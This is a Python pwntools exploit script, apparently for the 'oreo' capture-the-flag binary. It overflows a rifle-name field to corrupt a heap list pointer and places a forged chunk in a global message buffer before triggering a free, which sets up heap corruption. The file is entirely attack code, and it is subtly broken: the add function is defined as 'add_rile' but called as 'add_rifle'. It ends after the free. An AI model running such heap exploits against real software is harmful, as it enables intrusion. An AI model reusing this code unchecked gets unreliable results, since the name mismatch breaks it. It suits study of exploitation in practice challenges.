from pwn import *


binary = './oreo'
context.binary = binary
elf = ELF(binary)
libc = elf.libc
io = process(binary)


def add_rile(name, desc):
    io.sendline('1')
    io.sendline(name)
    io.sendline(desc)

    return


def show_rifle():
    sep = '==================================='

    io.sendline('2')
    io.recvuntil(sep)
    return io.recvuntil(sep).replace(sep, '')


def order_rifle():
    io.sendline('3')
    return


def leave_msg(notice):
    io.sendline('4')
    io.sendline(notice)
    return


def show_status():
    io.sendline('5')
    io.recvuntil('======= Status =======')
    sep = '======================'
    return io.recvuntil(sep).replace(sep, '')


global_buf_addr = 0x804a2c0
order_count_addr = 0x804a2a0
list_count_addr = 0x804a2a4


for i in range(0x40):
    add_rifle('A' * 4, 'B' * 4)


payload = ''
payload += 'C' * 0x1b
payload += p32(list_count_addr + 0x4)
add_rifle(payload, 'D' * 4)

payload = 'E' * (0x34 - 0x18)
payload += '\0' * 4
payload += 'H' * 4
payload += p32(0x40)


leave_msg(payload)
order_rifle()


